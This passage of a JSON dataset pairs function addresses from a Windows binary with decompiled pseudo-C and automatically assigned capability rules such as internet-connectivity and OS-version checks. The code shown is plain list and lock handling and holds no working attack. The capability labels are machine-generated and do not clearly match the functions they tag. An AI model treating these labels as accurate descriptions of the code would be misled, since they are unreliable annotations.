        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0003c530(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_64h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar var_ch [4];\n    uint var_8h;\n    \n    var_38h = 0;\n    var_10h._0_2_ = 0x888e;\n    var_10h._2_2_ = 0x8100;\n    var_3ch = 0;\n    var_18h = 0;\n    arg_8h_00 = fcn.00035230(0x208);\n    if (arg_8h_00 == 0) {\n        var_6ch = 0x21590004;\n    }\n    else {\n        fcn.00037150(0xb1c5b4c0, var_ch, 0);\n        iVar1 = fcn.0001b770(0xb1c5b4f0, 0, 0);\n        if (iVar1 == 0) {\n            fcn.00037180(0xb1c5b4c0, var_ch, 0);\n            var_6ch = 0x21590006;\n        }\n        else {\n            var_3ch = fcn.0003da90(arg_8h, 1);\n            if (var_3ch == 0) {\n                var_6ch = -0x3ffffff3;\n            }\n            else {\n                if (*(var_3ch + 0x16) == 0x24) {\n                    var_3ch = 0;\n                }\n                else {\n                    fcn.00078592(arg_8h_00, var_3ch + 0x16, 0x104);\n                    *(arg_8h_00 + 0x206) = 0;\n                }\n                var_6ch = 0;\n            }\n            fcn.00037180(0xb1c5b4c0, var_ch, 0);\n            if (var_3ch == 0) {\n                return var_6ch;\n            }\n            fcn.00078550(&var_8h, arg_8h_00);\n            var_34h = 0x1c0187;\n            var_30h = &var_8h;\n            var_2ch = &var_38h;\n            var_28h = 1;\n            var_24h = &var_14h;\n            var_20h = &var_10h;\n            var_1ch = 2;\n            puVar7 = &var_18h;\n            puVar6 = &var_64h;\n            puVar5 = &var_34h;\n            uVar3 = *0xb1c5b4dc;\n            uVar4 = *0xb1c5b4b4;\n            iVar1 = var_3ch;\n            pcVar2 = fcn.000639f0(*0xb1c5b4dc);\n            var_6ch = (*pcVar2)(uVar3, uVar4, iVar1, puVar5, puVar6, puVar7);\n            if (var_6ch == 0x103) {\n                fcn.0003d470(arg_8h_00, var_18h, 0, 0, 0);\n                var_6ch = fcn.0003c2d0(var_18h, 1);\n            }\n            if (var_6ch == 0) {\n                iVar1 = fcn.0003c720(var_18h, arg_8h_00);\n                if (iVar1 == 0) {\n                    fcn.0003cca0(var_18h);\n                }\n                else {\n                    (**0xb1c685b8)(var_18h);\n                }\n            }\n        }\n        fcn.00035330(arg_8h_00);\n    }\n    return var_6ch;\n}\n",
        "token_count": 1027
    },
    "0003c720": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nint32_t __cdecl fcn.0003c720(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint arg_14h;\n    uint arg_18h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = arg_8h;\n    do {\n        arg_8h_00 = *(var_ch + 8);\n        var_ch = *(arg_8h_00 + 8);\n        fcn.0003c850(arg_8h_00);\n        if (var_ch == 0) break;\n    } while (arg_8h_00 != var_ch);\n    arg_14h = *(arg_8h_00 + 0xc);\n    arg_18h = fcn.0003c850(arg_8h_00);\n    fcn.0003d470(arg_ch, arg_8h, arg_8h_00, arg_14h, arg_18h);\n    var_18h = fcn.0003a600(arg_18h);\n    if (var_18h == 0) {\n        fcn.0003d130(arg_8h, 0);\n        fcn.00039070();\n    }\n    if ((var_18h != -0x3fffffdf) && (var_18h != 0)) {\n        fcn.0003d470(arg_ch, 0, 0, 0, 0);\n    }\n    if ((var_18h == -0x3fffffdf) || (var_18h == 0)) {\n        var_18h = 0;\n    }\n    return var_18h;\n}\n",
        "token_count": 417
    },
    "0003c850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003c850(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_10h = 0;\n    var_4h = 0x4e4d4944;\n    (**0xb1bde048)(arg_8h, &var_ch, &var_8h, 0, 0, 0);\n    if (var_8h != 0) {\n        var_10h = (**0xb1bde20c)(*(var_8h + 8), var_4h);\n    }\n    return var_10h;\n}\n",
        "token_count": 172
    },
    "0003c8b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0003c8b0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint32_t *arg_1ch)\n\n{\n    uint var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    uint var_78h;\n    uint var_74h;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    \n    if (arg_ch == 0) {\n        var_94h = -0x3ffffff3;\n    }\n    else {\n        fcn.00078790(&var_90h, 0, 0x8c);\n        var_90h._0_1_ = 0x96;\n        var_90h._1_1_ = 1;\n        var_90h._2_2_ = 0x8c;\n        var_8ch = arg_8h;\n        var_88h = 0;\n        if (arg_8h == 0) {\n            var_78h = arg_10h;\n            var_74h = arg_14h;\n            var_70h = arg_18h;\n        }\n        else if (arg_8h == 1) {\n            var_78h = arg_10h;\n            var_74h = arg_14h;\n            var_70h = arg_18h;\n        }\n        var_94h = (**0xb1c5b3f4)(arg_ch, &var_90h);\n        if (var_94h == 0x103) {\n            var_94h = fcn.0003c2d0(arg_ch, 0);\n        }\n        if (((var_94h == 0) && (arg_1ch != NULL)) && (*arg_1ch = var_6ch,  arg_18h < *arg_1ch)) {\n            *arg_1ch = arg_18h;\n        }\n    }\n    return var_94h;\n}\n",
        "token_count": 492
    },
    "0003ca00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003ca00(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_4h = 0;\n    fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n    iVar1 = fcn.0003d400(arg_8h, 1);\n    if (iVar1 != 0) {\n        var_10h = *(iVar1 + 0x450);\n    }\n    fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n    if (var_10h == 0) {\n        var_28h = -0x3ffffff8;\n    }\n    else {\n        iVar1 = (**0xb1c5b3e8)(*0xb1c5b4ec, 8, 0);\n        if (iVar1 == 0) {\n            var_28h = -0x3fffff66;\n        }\n        else {\n            iVar2 = (**0xb1c5b41c)();\n            *(iVar1 + 100) = iVar2 << 0x18;\n            *(iVar1 + 0x3c) = var_10h;\n            *(iVar1 + 0x48) = *(iVar1 + 0x48) | 1;\n            var_4h = *(iVar1 + 4);\n            if (var_4h == 0) {\n                var_28h = -0x3fffff66;\n            }\n            else {\n                iVar2 = *(var_4h + 0x10);\n                if ((*(iVar2 + 6) & 5) == 0) {\n                    var_2ch = (**0xb1bde0e0)(iVar2, 0, 1, 0, 0, 0x20);\n                }\n                else {\n                    var_2ch = *(iVar2 + 0xc);\n                }\n                if (((*(iVar2 + 0x14) < arg_10h) || (iVar2 == 0)) || (var_2ch == 0)) {\n                    var_28h = -0x3fffff66;\n                }\n                else {\n                    fcn.0007877e(var_2ch, arg_ch, arg_10h);\n                    *(var_4h + 0xc) = arg_10h;\n                    *(var_4h + 0x14) = 0;\n                    *(var_4h + 8) = 0;\n                    (**0xb1c5b3f8)(var_10h, iVar1, 0, 0);\n                    var_28h = 0;\n                }\n            }\n        }\n        if ((var_28h != 0) && (iVar1 != 0)) {\n            (**0xb1c5b3ec)(iVar1);\n        }\n    }\n    return var_28h;\n}\n",
        "token_count": 755
    },
    "0003cbc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003cbc0(uint arg_8h, uint *arg_ch)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch != NULL) {\n        fcn.0003cc10(arg_8h, *arg_ch);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0003cc10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003cc10(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    iVar1 = fcn.0003da90(arg_8h, 1);\n    if (iVar1 != 0) {\n        var_8h = *(iVar1 + 0x450);\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    if (var_8h == 0) {\n        uVar2 = 0xc0000008;\n    }\n    else {\n        (**0xb1c5b3f8)(var_8h, arg_ch, 0, 0);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 245
    },
    "0003cca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0003cca0(uint arg_8h)\n\n{\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_18h = fcn.0003c8b0(0, arg_8h, 0x1010102, &var_ch, 6, &var_14h);\n    fcn.00037150(0xb1c5b4c0, &var_4h, 1);\n    var_10h = fcn.0003cdd0(arg_8h, 1);\n    if (var_10h == 0) {\n        var_18h = -0x3ffffff8;\n    }\n    else if (var_18h == 0) {\n        *(var_10h + 0x10) = var_ch;\n        *(var_10h + 0x14) = var_8h;\n    }\n    else {\n        *(var_10h + 0x10) = 0;\n        *(var_10h + 0x14) = 0;\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 1);\n    return var_18h;\n}\n",
        "token_count": 324
    },
    "0003cd40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003cd40(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_10h = fcn.0003c8b0(1, arg_8h, 0x1010e, arg_ch, 4, &var_ch);\n    fcn.00037150(0xb1c5b4c0, &var_4h, 1);\n    var_8h = fcn.0003cdd0(arg_8h, 1);\n    if (var_8h == 0) {\n        var_10h = -0x3ffffff8;\n    }\n    else if (var_10h == 0) {\n        *(var_8h + 0x420) = *arg_ch;\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 1);\n    return var_10h;\n}\n",
        "token_count": 248
    },
    "0003cdd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003cdd0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b4b8; (var_8h != NULL && (var_8h[0x114] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 187
    },
    "0003ce90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nuint * __cdecl fcn.0003ce90(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    bool bVar4;\n    uint var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = NULL;\n    var_10h = 0;\n    var_18h = NULL;\n    var_8h = *(arg_8h + 8);\n    while (puVar3 = fcn.00035230(0x10),  puVar3 != NULL) {\n        *puVar3 = 0;\n        puVar3[1] = 0;\n        puVar3[2] = 0;\n        puVar3[3] = 0;\n        puVar3[1] = var_8h;\n        puVar3[2] = *(var_8h + 0xc);\n        iVar1 = *(var_8h + 8);\n        puVar2 = puVar3;\n        if (var_18h != NULL) {\n            *var_18h = puVar3;\n            puVar2 = var_18h;\n        }\n        var_18h = puVar2;\n        if (var_14h == NULL) {\n            var_14h = puVar3;\n        }\n        if ((iVar1 == 0) || (bVar4 = iVar1 == var_8h,  var_8h = iVar1,  bVar4)) goto code_r0x0003cf4e;\n    }\n    var_10h = -0x3fffff66;\ncode_r0x0003cf4e:\n    if (var_10h != 0) {\n        var_1ch = var_14h;\n        while (var_1ch != NULL) {\n            puVar3 = *var_1ch;\n            fcn.00035330(var_1ch);\n            var_1ch = puVar3;\n        }\n        var_14h = NULL;\n    }\n    return var_14h;\n}\n",
        "token_count": 515
    },
    "0003d010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003d010(int32_t *arg_8h, uint *arg_ch)\n\n{\n    int32_t var_14h;\n    uint var_10h;\n    int32_t **var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *arg_ch = 0;\n    var_14h = 0;\n    var_10h = 0xc0000001;\n    fcn.00037150(0xb1c68588, &var_4h, 1);\n    for (var_8h = 0; var_8h < *0xb1c68580; var_8h = var_8h + 1) {\n        for (var_ch = *(*0xb1c68584 + var_8h * 0x10); var_ch != NULL; var_ch = *var_ch) {\n            if ((arg_8h == var_ch[2]) && (*var_ch != NULL)) {\n                var_14h = (*var_ch)[2];\n                break;\n            }\n        }\n        if (var_14h != 0) break;\n    }\n    if (var_14h != 0) {\n        for (var_8h = 0; var_8h < *0xb1c68580; var_8h = var_8h + 1) {\n            if (*(*0xb1c68584 + 0xc + var_8h * 0x10) == var_14h) {\n                *arg_ch = *(*0xb1c68584 + 4 + var_8h * 0x10);\n                var_10h = 0;\n                break;\n            }\n        }\n    }\n    fcn.00037180(0xb1c68588, &var_4h, 1);\n    return var_10h;\n}\n",
        "token_count": 409
    },
    "0003d130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003d130(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    fcn.00037150(0xb1c68588, &var_4h, 1);\n    if (*0xb1c68584 != 0) {\n        for (var_8h = 0; var_8h < *0xb1c68580; var_8h = var_8h + 1) {\n            var_20h = *(*0xb1c68584 + var_8h * 0x10);\n            while (var_20h != NULL) {\n                puVar1 = *var_20h;\n                fcn.00035330(var_20h);\n                var_20h = puVar1;\n            }\n        }\n        fcn.00035330(*0xb1c68584);\n        *0xb1c68580 = 0;\n    }\n    *0xb1c68584 = 0;\n    if (arg_ch == 0) {\n        var_10h = 1;\n        var_ch = arg_8h;\n        while (((iVar2 = *(var_ch + 0xc4),  iVar2 != 0 && (iVar2 != var_ch)) && (iVar2 != var_ch + 0xc4))) {\n            var_10h = var_10h + 1;\n            var_ch = iVar2;\n        }\n        *0xb1c68584 = fcn.00035230(var_10h << 4);\n        if (*0xb1c68584 == 0) {\n            var_14h = -0x3fffff66;\n        }\n        else {\n            fcn.00078790(*0xb1c68584, 0, var_10h << 4);\n            var_ch = arg_8h;\n            for (var_8h = 0; var_8h < var_10h; var_8h = var_8h + 1) {\n                *(*0xb1c68584 + 4 + var_8h * 0x10) = var_ch;\n                *(*0xb1c68584 + 8 + var_8h * 0x10) = *(var_ch + 0xc);\n                *(*0xb1c68584 + 0xc + var_8h * 0x10) = *(var_ch + 0x1c);\n                uVar3 = fcn.0003ce90(var_ch);\n                *(*0xb1c68584 + var_8h * 0x10) = uVar3;\n                if (*(*0xb1c68584 + var_8h * 0x10) == 0) {\n                    var_14h = -0x3fffff66;\n                    break;\n                }\n                iVar2 = *(var_ch + 0xc4);\n                if ((iVar2 == 0) || (iVar2 == var_ch)) break;\n                var_ch = iVar2;\n            }\n        }\n        *0xb1c68580 = var_10h;\n        if ((var_14h != 0) && (*0xb1c68584 != 0)) {\n            for (var_8h = 0; var_8h < *0xb1c68580; var_8h = var_8h + 1) {\n                var_28h = *(*0xb1c68584 + var_8h * 0x10);\n                while (var_28h != NULL) {\n                    puVar1 = *var_28h;\n                    fcn.00035330(var_28h);\n                    var_28h = puVar1;\n                }\n            }\n            fcn.00035330(*0xb1c68584);\n            *0xb1c68580 = 0;\n        }\n        fcn.00037180(0xb1c68588, &var_4h, 1);\n    }\n    else {\n        fcn.00037180(0xb1c68588, &var_4h, 1);\n        var_14h = 0;\n    }\n    return var_14h;\n}\n",
        "token_count": 1012
    },
    "0003d400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003d400(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b4b8; (var_8h != NULL && (var_8h[0x115] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 186
    },
    "0003d470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003d470(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_40h;\n    uint var_38h;\n    int16_t *var_34h;\n    uint var_30h;\n    uint var_28h;\n    int16_t *var_24h;\n    uint var_20h;\n    uint var_18h;\n    int16_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    if ((((arg_8h == NULL) || (arg_ch == 0)) || (arg_10h == 0)) || (arg_14h == 0)) {\n        uVar2 = 0xc000000d;\n    }\n    else {\n        iVar3 = fcn.0003d9a0(arg_18h, 0, 0);\n        if (iVar3 == 0) {\n            uVar2 = 0xc000000d;\n        }\n        else {\n            fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n            for (var_8h = *0xb1c5b4b8; var_8h != NULL; var_8h = *var_8h) {\n                var_14h = arg_8h;\n                do {\n                    iVar1 = *var_14h;\n                    var_14h = var_14h + 1;\n                } while (iVar1 != 0);\n                var_24h = var_8h + 0x16;\n                do {\n                    iVar1 = *var_24h;\n                    var_24h = var_24h + 1;\n                } while (iVar1 != 0);\n                if (var_14h - (arg_8h + 1) >> 1 == var_24h - (var_8h + 6) >> 1) {\n                    var_34h = arg_8h;\n                    do {\n                        iVar1 = *var_34h;\n                        var_34h = var_34h + 1;\n                    } while (iVar1 != 0);\n                    iVar4 = fcn.00036010(arg_8h, var_8h + 0x16, var_34h - (arg_8h + 1) >> 1);\n                    if (iVar4 == 0) break;\n                }\n            }\n            if (var_8h != NULL) {\n                var_8h[0x118] = iVar3;\n                var_8h[0x115] = arg_10h;\n                var_8h[0x116] = arg_14h;\n                var_8h[0x117] = arg_18h;\n                var_8h[0x114] = arg_ch;\n                var_8h[0x11c] = 0;\n                var_8h[2] = 1;\n            }\n            fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 757
    },
    "0003d630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003d630(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_ch = 0;\n    fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    iVar1 = fcn.0003da90(arg_8h, 1);\n    if (iVar1 == 0) {\n        var_ch = 0;\n    }\n    else {\n        var_ch = *(iVar1 + 8);\n    }\n    *arg_ch = var_ch;\n    fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    return (-(iVar1 != 0) & 0x3fffffff) + 0xc0000001;\n}\n",
        "token_count": 202
    },
    "0003d6b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003d6b0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00037150(0xb1c5b4c0, &var_4h, 1);\n    var_8h = NULL;\n    for (var_ch = *0xb1c5b4b8; (var_ch != NULL && (var_ch[1] != arg_8h)); var_ch = *var_ch) {\n        var_8h = var_ch;\n    }\n    if (var_ch != NULL) {\n        if (var_8h == NULL) {\n            *0xb1c5b4b8 = *var_ch;\n        }\n        else {\n            *var_8h = *var_ch;\n        }\n        *0xb1c5b4bc = *0xb1c5b4bc + -1;\n    }\n    fcn.00037180(0xb1c5b4c0, &var_4h, 1);\n    if (var_ch == NULL) {\n        uVar1 = 0xc0000225;\n    }\n    else {\n        fcn.000371b0(var_ch + 0x109);\n        fcn.00034080(var_ch + 0x11a);\n        fcn.00034080(var_ch + 0x119);\n        fcn.00035330(var_ch[0x106]);\n        fcn.00035330(var_ch);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 360
    },
    "0003d7b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003d7b0(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_210h;\n    ushort var_12h;\n    uint *var_10h;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_10h = NULL;\n    var_ch = NULL;\n    fcn.00078556(&var_210h, 0x100, 0xb1be1ef4, arg_8h);\n    var_12h = 0;\n    fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n    if (*0xb1c5b4bc < 0x65) {\n        var_10h = *0xb1c5b4b8;\n        var_4h = 0;\n        var_ch = NULL;\n        while ((var_10h != NULL && (iVar1 = fcn.00078580(&var_210h, var_10h + 0x16),  iVar1 != 0))) {\n            var_ch = var_10h;\n            var_10h = *var_10h;\n            var_4h = var_4h + 1;\n        }\n        fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n        if (var_10h == NULL) {\n            var_10h = fcn.00035230(0x474);\n            if (var_10h == NULL) {\n                var_10h = NULL;\n            }\n            else {\n                fcn.00078790(var_10h, 0, 0x474);\n                fcn.00078592(var_10h + 0x16, &var_210h, 0x100);\n                *(var_10h + 0x105) = 0;\n                fcn.00078592(var_10h + 0x216, arg_8h, 0x100);\n                *(var_10h + 0x105) = 0;\n                if (*arg_8h == 0x24) {\n                    var_10h[3] = 1;\n                }\n                var_10h[1] = var_4h + 1;\n                var_10h[0x108] = 9;\n                fcn.00036f50(var_10h + 0x109);\n                fcn.00033ff0(var_10h + 0x11a);\n                fcn.00033ff0(var_10h + 0x119);\n                fcn.00037150(0xb1c5b4c0, &var_8h, 1);\n                *var_10h = *0xb1c5b4b8;\n                *0xb1c5b4b8 = var_10h;\n                *0xb1c5b4bc = *0xb1c5b4bc + 1;\n                fcn.00037180(0xb1c5b4c0, &var_8h, 1);\n            }\n        }\n    }\n    else {\n        var_10h = NULL;\n    }\n    return var_10h;\n}\n",
        "token_count": 729
    },
    "0003d9a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003d9a0(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = 0;\n    }\n    for (var_8h = *0xb1c5b4cc; (var_8h != NULL && (var_8h[2] != arg_8h)); var_8h = *var_8h) {\n        if (arg_10h != NULL) {\n            *arg_10h = var_8h;\n        }\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 240
    },
    "0003da90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003da90(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b4b8; (var_8h != NULL && (var_8h[1] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 184
    },
